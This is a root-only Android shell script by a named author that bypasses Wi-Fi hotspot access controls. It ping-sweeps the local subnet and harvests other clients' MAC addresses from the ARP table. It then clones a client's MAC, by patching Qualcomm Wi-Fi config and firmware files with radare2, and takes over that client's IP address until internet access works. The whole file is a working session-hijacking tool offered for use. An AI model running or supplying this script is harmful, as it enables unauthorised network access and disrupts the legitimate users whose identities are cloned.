#!/system/bin/sh
#
# script to bypass some wifi hotspots
# tested on Nexus 4 and Nexus 7 (2013), needs root, busybox and radare2
# 
# (c) 2013 Pau Oliva Fora (@pof) 
# License: GPLv2+
#

IFACE=wlan0

id |grep "root" >/dev/null 2>&1
if [ $? != 0 ]; then
	echo "$0 must be run as root"
	exit 1
fi

if [ "$1" == "r" ]; then
	echo "[+] Restore wifi mac"
	svc wifi disable
	if [ -f /data/misc/wifi/WCNSS_qcom_cfg.ini.bkp ] && [ -f /data/misc/wifi/WCNSS_qcom_wlan_nv.bin.bkp ]; then
		cp /data/misc/wifi/WCNSS_qcom_cfg.ini.bkp /data/misc/wifi/WCNSS_qcom_cfg.ini
		cp /data/misc/wifi/WCNSS_qcom_wlan_nv.bin.bkp /data/misc/wifi/WCNSS_qcom_wlan_nv.bin
	fi
	svc wifi enable
	echo "[+] done."
	exit 0
fi


if [ -f /data/misc/wifi/WCNSS_qcom_cfg.ini ] && [ -f /data/misc/wifi/WCNSS_qcom_wlan_nv.bin ]; then
	if [ ! -f /data/misc/wifi/WCNSS_qcom_cfg.ini.bkp ]; then
		cp /data/misc/wifi/WCNSS_qcom_cfg.ini /data/misc/wifi/WCNSS_qcom_cfg.ini.bkp
	fi
	if [ ! -f /data/misc/wifi/WCNSS_qcom_wlan_nv.bin.bkp ]; then
		cp /data/misc/wifi/WCNSS_qcom_wlan_nv.bin /data/misc/wifi/WCNSS_qcom_wlan_nv.bin.bkp
	fi
fi

function changemac() {
	newmac=$(echo $1 |sed -e "s/://g")
	mymac=`ip addr show ${IFACE} |grep link/ether |awk '{print $2}' |sed -e "s/://g"`

	len=`echo -n ${mymac} |wc -c`
	if [ "$len" != "12" ]; then
		echo "ERROR: can't get my mac"
		exit 1
	fi

	len=`echo -n ${newmac} |wc -c`
	if [ "$len" != "12" ]; then
		echo "ERROR: can't get target mac"
		exit 1
	fi

	if [ -f /data/misc/wifi/WCNSS_qcom_cfg.ini ] && [ -f /data/misc/wifi/WCNSS_qcom_wlan_nv.bin ]; then
		sed -i "s/${mymac}/${newmac}/gI" /data/misc/wifi/WCNSS_qcom_cfg.ini
		/data/data/org.radare.installer/radare2/bin/r2 -c "wx ${newmac}@0xa" -n -q -w /data/misc/wifi/WCNSS_qcom_wlan_nv.bin
	else
		ip link set ${IFACE} down
		ip link set dev ${IFACE} address $1
		ip link set ${IFACE} up
	fi
}

ipmask=`ip addr show dev ${IFACE} |grep "inet " |awk '{print $2}'`
myip=`echo ${ipmask} |cut -f 1 -d "/"`
mask=`echo ${ipmask} |cut -f 2 -d "/"`
brd=`ip addr show dev ${IFACE} |grep "inet.*brd" |awk '{print $4}'`
gw=`ip route |grep "^default via" |awk '{print $3}'`

# get gw mac
ping -n -c1 -w1 ${gw} >/dev/null
gwmac=`ip neighbour show dev ${IFACE} |grep lladdr |grep "^${gw} " |awk '{print $3}' |tr [:upper:] [:lower:]`

# loop through the 255 addresses of our netblock
# loop through the 255 addresses of the gw netblock
oc1=`echo ${myip} |cut -f 1 -d "."`
oc2=`echo ${myip} |cut -f 2 -d "."`
oc3=`echo ${myip} |cut -f 3 -d "."`
oc3gw=`echo ${gw} |cut -f 3 -d "."`

echo "Please wait..."
loop=`printf "${oc3}\n${oc3gw}\n" |uniq`
for o in $loop ; do
	for f in `seq 1 255` ; do

		ip=${oc1}.${oc2}.${o}.${f}
		echo -n "Testing ${ip} "

		if [ "${ip}" == "${brd}" ]; then
			echo
			continue
		fi

		ping -n -c1 -w1 ${ip} >/dev/null
		mac=`ip neighbour show dev ${IFACE} |grep lladdr |grep "^${ip} " |awk '{print $3}' |tr [:upper:] [:lower:]`

		if [ "${mac}" == "${gwmac}" ]; then
			# try to avoid gateways answering all arp requests (and fix busybox arping output)
			mac=`arping -I ${IFACE} -c 1 -w 1 -b ${ip} |grep reply |awk '{print $5}' |uniq |tr [:upper:] [:lower:] |sed -e "s:\[::" -e "s:\]::" |sed -e "s/:0:/:00:/g" -e "s/:1:/:01:/g" -e "s/:2:/:02:/g" -e "s/:3:/:03:/g" -e "s/:4:/:04:/g" -e "s/:5:/:05:/g" -e "s/:6:/:06:/g" -e "s/:7:/:07:/g" -e "s/:8:/:08:/g" -e "s/:9:/:09:/g" -e "s/:a:/:0a:/g" -e "s/:b:/:0b:/g" -e "s/:c:/:0c:/g" -e "s/:d:/:0d:/g" -e "s/:e:/:0e:/g" -e "s/:f:/:0f:/g" -e "s/^0:/00:/g" -e "s/^1:/01:/g" -e "s/^2:/02:/g" -e "s/^3:/03:/g" -e "s/^4:/04:/g" -e "s/^5:/05:/g" -e "s/^6:/06:/g" -e "s/^7:/07:/g" -e "s/^8:/08:/g" -e "s/^9:/09:/g" -e "s/^a:/0a:/g" -e "s/^b:/0b:/g" -e "s/^c:/0c:/g" -e "s/^d:/0d:/g" -e "s/^e:/0e:/g" -e "s/^f:/0f:/g" -e "s/:0$/:00/g" -e "s/:1$/:01/g" -e "s/:2$/:02/g" -e "s/:3$/:03/g" -e "s/:4$/:04/g" -e "s/:5$/:05/g" -e "s/:6$/:06/g" -e "s/:7$/:07/g" -e "s/:8$/:08/g" -e "s/:9$/:09/g" -e "s/:a$/:0a/g" -e "s/:b$/:0b/g" -e "s/:c$/:0c/g" -e "s/:d$/:0d/g" -e "s/:e$/:0e/g" -e "s/:f$/:0f/g" |grep -v "$gwmac" |sed -e "s:\[::" -e "s:\]::" |head -n 1`
		fi

		if [ -z "${mac}" ]; then
			echo
			continue
		fi

		echo "- ${mac}"

		echo "[+] disable wifi"
		svc wifi disable
		sleep 4
		echo "[+] change mac"
		changemac ${mac}
		sleep 1
		echo "[+] enable wifi"
		svc wifi enable
		sleep 9

		echo "[+] flush dev"
		ip addr flush dev ${IFACE}
		echo "[+] change ip"
		ip addr add ${ip}/${mask} broadcast ${brd} dev ${IFACE}
		echo "[+] add gw"
		ip route add default via ${gw}
		echo "[+] test connectivity"

		# allow iface to settle
		sleep 1
		# wait at least 3 sec for an icmp response
		ping -c1 -w3 8.8.8.8 >/dev/null
		case $? in
			"0") echo "CONNECTED! :)" ; exit 0 ;;
			"2") sleep 5 ;; #interface not ready yet
		esac
		# test a second host, just in case
		ping -c1 -w3 192.0.43.10 >/dev/null
		if [ $? -eq 0 ]; then
			echo "CONNECTED! :)"
			exit 0
		fi
	done
done
